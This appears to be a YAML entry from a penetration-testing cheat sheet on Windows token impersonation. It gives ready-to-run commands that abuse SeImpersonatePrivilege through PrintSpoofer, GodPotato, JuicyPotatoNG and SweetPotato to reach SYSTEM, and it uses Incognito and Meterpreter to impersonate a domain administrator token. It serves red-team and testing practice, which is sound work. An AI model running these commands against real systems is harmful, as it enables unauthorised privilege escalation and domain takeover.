---
description: |
  Token impersonation — abuse SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to escalate to SYSTEM or impersonate domain users.
commands:
  - have: Shell
    cmd: |
      # Check current privileges
      whoami /priv
      # Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege

      # PrintSpoofer — SeImpersonate to SYSTEM
      .\PrintSpoofer.exe -i -c cmd

      # GodPotato — SeImpersonate to SYSTEM
      .\GodPotato.exe -cmd "cmd /c whoami"

      # JuicyPotatoNG — SeImpersonate to SYSTEM
      .\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"

      # SweetPotato — SeImpersonate to SYSTEM
      .\SweetPotato.exe -p cmd.exe -a "/c whoami"
  - have: Token
    cmd: |
      # Incognito — list available tokens (from Meterpreter or standalone)
      incognito.exe list_tokens -u

      # Incognito — impersonate a domain admin token
      incognito.exe impersonate_token "SENSHU\Administrator"

      # Meterpreter — load incognito and impersonate
      # meterpreter > load incognito
      # meterpreter > list_tokens -u
      # meterpreter > impersonate_token "SENSHU\\Administrator"
phase:
  - Exploitation
target_os:
  - Windows
services: []
techniques:
  - Token_Impersonation
references:
  - https://github.com/itm4n/PrintSpoofer
  - https://github.com/BeichenDream/GodPotato
  - https://github.com/ohpe/juicy-potato
---
